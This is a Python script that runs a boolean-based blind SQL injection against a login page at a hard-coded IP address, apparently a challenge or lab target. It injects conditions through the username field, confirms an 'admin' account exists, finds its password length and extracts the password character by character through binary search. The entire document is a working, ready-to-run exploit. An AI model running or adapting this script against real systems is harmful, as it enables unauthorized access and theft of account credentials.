import requests

url = 'http://103.31.39.226:7004/index.php'

def is_true(condition):
    payload = {
        'username': f"' or {condition} -- ",
        'password': 'anything'
    }
    response = requests.post(url, data=payload)
    return 'Welcome!' in response.text

# Step 1: Check if 'admin' exists
admin_exists = is_true("exists(select 1 from users where username='admin')")
print(f"Admin exists: {admin_exists}")

if not admin_exists:
    exit()

# Step 2: Find password length
length = 1
while True:
    condition = f"(select length(password) from users where username='admin')={length}"
    if is_true(condition):
        break
    length += 1
print(f"Password length: {length}")

# Step 3: Extract each character
password = []
for pos in range(1, length + 1):
    low, high = 32, 126  # ASCII printable range
    while low <= high:
        mid = (low + high) // 2
        char_condition = f"(select unicode(substr(password,{pos},1)) from users where username='admin') <= {mid}"
        if is_true(char_condition):
            high = mid - 1
        else:
            low = mid + 1
    # Check if low is correct
    final_condition = f"(select unicode(substr(password,{pos},1)) from users where username='admin') = {low}"
    if is_true(final_condition):
        password.append(chr(low))
        print(f"Position {pos}: {chr(low)}")
    else:
        password.append('?')
        print(f"Position {pos}: Unknown")

print(f"Admin Password: {''.join(password)}")
